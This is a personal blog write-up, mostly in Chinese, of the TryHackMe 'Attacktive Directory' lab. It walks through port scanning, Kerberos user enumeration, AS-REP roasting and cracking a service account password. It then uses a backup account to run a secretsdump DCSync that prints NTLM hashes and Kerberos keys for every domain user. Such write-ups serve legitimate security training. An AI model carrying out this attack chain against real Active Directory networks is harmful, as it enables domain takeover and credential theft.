---
title: THM Attacktive Directory
published: 2025-10-26
tags: [THM,Windows,AD]
category: PenTest
draft: false
image: 'image.png'
---


## Recon

```bash
┌──(kali😺kali)-[~]
└─$ rustscan -a  10.201.83.237 -r 1-65535 -- -sC -sV -Pn -r
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.201.83.237:53
Open 10.201.83.237:80
Open 10.201.83.237:88
Open 10.201.83.237:139
Open 10.201.83.237:135
Open 10.201.83.237:389
Open 10.201.83.237:445
Open 10.201.83.237:464
Open 10.201.83.237:593
Open 10.201.83.237:636
Open 10.201.83.237:3268
Open 10.201.83.237:3269
Open 10.201.83.237:3389
Open 10.201.83.237:5985
Open 10.201.83.237:9389
Open 10.201.83.237:47001
Open 10.201.83.237:49667
Open 10.201.83.237:49671
Open 10.201.83.237:49664
Open 10.201.83.237:49670
Open 10.201.83.237:49665
Open 10.201.83.237:49669
Open 10.201.83.237:49673
Open 10.201.83.237:49677
Open 10.201.83.237:49696
Open 10.201.83.237:49691
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn -r" on ip 10.201.83.237
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 01:28 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:28
Completed NSE at 01:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:28
Completed NSE at 01:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:28
Completed NSE at 01:28, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 01:28
Completed Parallel DNS resolution of 1 host. at 01:28, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 01:28
Scanning 10.201.83.237 [26 ports]
Discovered open port 80/tcp on 10.201.83.237
Discovered open port 135/tcp on 10.201.83.237
Discovered open port 139/tcp on 10.201.83.237
Discovered open port 53/tcp on 10.201.83.237
Discovered open port 593/tcp on 10.201.83.237
Discovered open port 389/tcp on 10.201.83.237
Discovered open port 88/tcp on 10.201.83.237
Discovered open port 464/tcp on 10.201.83.237
Discovered open port 445/tcp on 10.201.83.237
Discovered open port 636/tcp on 10.201.83.237
Discovered open port 47001/tcp on 10.201.83.237
Discovered open port 3389/tcp on 10.201.83.237
Discovered open port 49691/tcp on 10.201.83.237
Discovered open port 49665/tcp on 10.201.83.237
Discovered open port 9389/tcp on 10.201.83.237
Discovered open port 3268/tcp on 10.201.83.237
Discovered open port 49669/tcp on 10.201.83.237
Discovered open port 49673/tcp on 10.201.83.237
Discovered open port 49664/tcp on 10.201.83.237
Discovered open port 5985/tcp on 10.201.83.237
Discovered open port 49696/tcp on 10.201.83.237
Discovered open port 49667/tcp on 10.201.83.237
Discovered open port 49671/tcp on 10.201.83.237
Discovered open port 49670/tcp on 10.201.83.237
Discovered open port 49677/tcp on 10.201.83.237
Discovered open port 3269/tcp on 10.201.83.237
Completed SYN Stealth Scan at 01:28, 0.94s elapsed (26 total ports)
Initiating Service scan at 01:28
Scanning 26 services on 10.201.83.237
Completed Service scan at 01:30, 69.30s elapsed (26 services on 1 host)
NSE: Script scanning 10.201.83.237.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:30
Completed NSE at 01:30, 14.47s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:30
Completed NSE at 01:30, 16.96s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:30
Completed NSE at 01:30, 0.00s elapsed
Nmap scan report for 10.201.83.237
Host is up, received user-set (0.45s latency).
Scanned at 2025-10-26 01:28:51 EDT for 102s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 124 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 124 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 124 Microsoft Windows Kerberos (server time: 2025-10-26 05:29:00Z)
135/tcp   open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 124 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 124 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 124
464/tcp   open  kpasswd5?     syn-ack ttl 124
593/tcp   open  ncacn_http    syn-ack ttl 124 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 124
3268/tcp  open  ldap          syn-ack ttl 124 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 124
3389/tcp  open  ms-wbt-server syn-ack ttl 124 Microsoft Terminal Services
|_ssl-date: 2025-10-26T05:30:18+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-26T05:30:08+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-25T05:26:49
| Not valid after:  2026-04-26T05:26:49
| MD5:   eaef:e238:c1d6:30ec:42e7:0bf9:8874:98e9
| SHA-1: ade5:af15:1998:4ed1:b314:abe1:fd4c:2b5d:65dc:6c66
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQYEadyMkAwJtAodylF9iXUTANBgkqhkiG9w0BAQsFADAu
| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe
| Fw0yNTEwMjUwNTI2NDlaFw0yNjA0MjYwNTI2NDlaMC4xLDAqBgNVBAMTI0F0dGFj
| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAww+cv+gTCBklznsHfjg+4xkozFnMV/GOJj6qhA2XKYJE
| Q2ncI/tCrUtC7KNzKR/JvNZBWDMduAQfM49kFv7qpkWMWhRtZRMfV0POtfLgD5sl
| rKTbMsJn7w+OPaaz268gLi9MmGONsyCdBbSPmgx9nbSv8ZuMDH1Wy15F1wt09h5i
| vOqE2hlRFFVzLiTvyiHTx/4hWIUFx0LsZXPa4S8kJK0YpNEEslTmLH3y5wauCrZv
| tKt+cJhIZ5C/tE3GqKe5dwD4CGIhl7Im9MX3FzWx42A9xplCxzsWvoYDdzCXvJ5/
| I94Lq401YPw60FWg1HKnV58hFRiv9lqW6pvxTi/PrQIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBALjU
| Th6fBYc4Pxq4bqhmIisL+0O6WAPS5XGXD0b9qzLqC6wdF3Ro0dF9CvO8u3lRJ7PP
| a4fV3XfUPXo6X8oeXRuRNvJu7cqv/aOIM/DwH1LjyDSyy0YABmryjcZRmcZrkCsU
| 9L9GjMhboXDKuSedDWjHXvhhuotqwfGpwEejBQ+2BPXoLBbBFJKsdRosyCMmD3C5
| bwGIeYCQmpKaliAyz7yo6VMhqRguh2JiNpiFZDtz2h8kCc8KfDvSoRtU5+uTbLrq
| j+Q+UKkSEAjnS1IhSIEx0stV+jfzr8Nz3vC3bGj3cYqQ66FhbOTDi2T1ZwrgfS7g
| LWqGOwuG8uC/KgHzpCY=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 124 .NET Message Framing
47001/tcp open  http          syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 124 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-10-26T05:30:05
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 60898/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 57590/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45213/udp): CLEAN (Failed to receive data)
|   Check 4 (port 64955/udp): CLEAN (Data received, but checksum was invalid (possibly INFECTED))
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: -1s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:30
Completed NSE at 01:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:30
Completed NSE at 01:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:30
Completed NSE at 01:30, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.28 seconds
           Raw packets sent: 26 (1.144KB) | Rcvd: 26 (1.144KB)

```

Link: https://tryhackme.com/room/attacktivedirectory

Recon 出來 domain 叫做 `spookysec.local`，所以把他寫入 `/etc/hosts`

## Exploit

題目說要載工具: https://github.com/SecureAuthCorp/impacket.git 

```bash=
sudo apt install bloodhound neo4j
```

可以從 Recon 中發現他的 port 139 是開的，所以用另一個工具繼續做 Recon

```bash=
┌──(kali😺kali)-[~]
└─$ enum4linux  10.201.83.237
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 26 01:43:14 2025

 =========================================( Target Information )=========================================

Target ........... 10.201.83.237
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.201.83.237 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.201.83.237 )===============================

Looking up status of 10.201.83.237
No reply from 10.201.83.237

 ===================================( Session Check on 10.201.83.237 )===================================


[+] Server 10.201.83.237 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.201.83.237 )================================

Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 10.201.83.237 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.201.83.237 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.201.83.237 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 10.201.83.237 )=================================

do_connect: Connection to 10.201.83.237 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.201.83.237


 ===========================( Password Policy Information for 10.201.83.237 )===========================


[E] Unexpected error from polenum:



[+] Attaching to 10.201.83.237 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.201.83.237)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient



 ======================================( Groups on 10.201.83.237 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.201.83.237 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID:
S-1-5-21-3591857110-2884097990-301047963

[I] Found new SID:
S-1-5-21-3591857110-2884097990-301047963

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''

S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''

S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

 ===============================( Getting printer info for 10.201.83.237 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sun Oct 26 02:09:27 2025
```

所以目前我們知道 net-bios 的 domain 叫做 `THM-AD`

這邊有個小知識點，通常大家在架一個虛擬網域都會用 `.local` 當結尾

![image](https://hackmd.io/_uploads/ByjlDNiCxg.png)

接下來用他給的工具 `kerbrute` 去 brute force 可用的 username & password，但他的敘述有說，在日常情況下，盡量不要這樣爆破，因為有些會有輸入次數的問題，輸入過多就上鎖

![image](https://hackmd.io/_uploads/BJeS3NsRxl.png)


```bash=
┌──(kali😺kali)-[~/my_pt_tools/windows_ad]
└─$ ./kerbrute_linux_amd64 userenum --dc 10.201.83.237 -d spookysec.local userlist.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 10/26/25 - Ronnie Flathers @ropnop

2025/10/26 02:06:18 >  Using KDC(s):
2025/10/26 02:06:18 >   10.201.83.237:88

2025/10/26 02:06:20 >  [+] VALID USERNAME:       james@spookysec.local
2025/10/26 02:06:28 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/10/26 02:06:39 >  [+] VALID USERNAME:       James@spookysec.local
2025/10/26 02:06:42 >  [+] VALID USERNAME:       robin@spookysec.local
2025/10/26 02:07:30 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/10/26 02:08:03 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/10/26 02:08:56 >  [+] VALID USERNAME:       backup@spookysec.local
2025/10/26 02:09:21 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/10/26 02:12:24 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/10/26 02:13:19 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/10/26 02:19:06 >  [+] VALID USERNAME:       Administrator@spookysec.local
2025/10/26 02:29:27 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2025/10/26 02:32:47 >  [+] VALID USERNAME:       Paradox@spookysec.local
2025/10/26 02:45:45 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2025/10/26 02:48:49 >  [+] VALID USERNAME:       ori@spookysec.local
2025/10/26 02:54:38 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2025/10/26 03:08:44 >  Done! Tested 73317 usernames (16 valid) in 3745.605 seconds
```

解完之後可以看到兩個很可疑的 username (我其實也不知道為啥不是 administrator)

接下來跟著題目的說明繼續走下去，他說 kerberos 在 user 不需要 Pre-Authentication 的時候，他不用拿任何有效的認證去找 kerberos 要門票 (ticket)

接下來要用 `impacket` 上面的 `GetNPUsers` ，這工具大概就是利用前面說的特性，去送一個需要認證的請求 (AS-REQ) 去看你是不是 pre-auth ，如果不是的話， `GetNPUsers` 會噴出一段 Hash

```bash=
┌──(kali😺kali)-[~/my_pt_tools/windows_ad]
└─$ impacket-GetNPUsers -no-pass -usersfile userlist.txt -dc-ip 10.201.83.237 spookysec.local/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
```

![image](https://hackmd.io/_uploads/rJGvlBsAxl.png)

 有了這一坨 hash 之後，丟進去 john 之後，他就死掉ㄌ QQ
 
 ![image](https://hackmd.io/_uploads/SyEnMrsAxl.png)

所以改用 hashcat

```bash=

┌──(kali😺kali)-[~/my_pt_tools/windows_ad]
└─$ hashcat -m 18200 test.txt passwordlist.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-QEMU Virtual CPU version 2.5+, 6943/13951 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: passwordlist.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:847091dfddeba6bfa6f74242848ce9d4$e3bf02af03df3af6f5cfad8daac4dfedb4ab45f6f14580fb1ec031607df83aa41b59f776164205100275980023bb9f0e2b612c3941ad1478aa85a27089abd019e49a0eb0a7789f96c50ee75d2d8fa38d5f28942cee6b3777f0883acba155ca78680d555298951873db6a58f05e7d1fd1f50ff1e567d6ba2b26a319cdabf5bab325da3ce9049ea9f5020b679765541c13307181359744fb7e3be5cd72099b52a1c64d91a12337b88aeadc0f8f98a6334b1873eac7cbbafff18c908378d8cdf1b79bd9bd842fae59a0638b65338a7612204209512635e0c011b384466a88ae005c6df148816cc2c01412f736e23bfa2a984fe2:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:847091dfdde...984fe2
Time.Started.....: Sun Oct 26 02:41:17 2025 (1 sec)
Time.Estimated...: Sun Oct 26 02:41:18 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    51677 H/s (2.74ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/70188 (11.67%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/70188 (5.84%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> whitey

Started: Sun Oct 26 02:40:38 2025
Stopped: Sun Oct 26 02:41:19 2025

```

解出來是 `management2005`，把它拿去登 smb 

先列他的 sharefile name

![image](https://hackmd.io/_uploads/BJr9NroAle.png)

知道有 backup 

![image](https://hackmd.io/_uploads/H1UaErsAeg.png)

登入進去拿到 `backup_credentials.txt` 高歌離席

解出來是 base64，直接拿去解碼

![image](https://hackmd.io/_uploads/SJHgSHiRgl.png)

有了這個帳號之後，我們可以用 `impackets` 上的 `secretdump` 去撈更多帳號

```bash=
┌──(kali😺kali)-[~/my_pt_tools/windows_ad]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup@spookysec.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:b8dfd6ef3ee00cd3094e959e132ba510:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
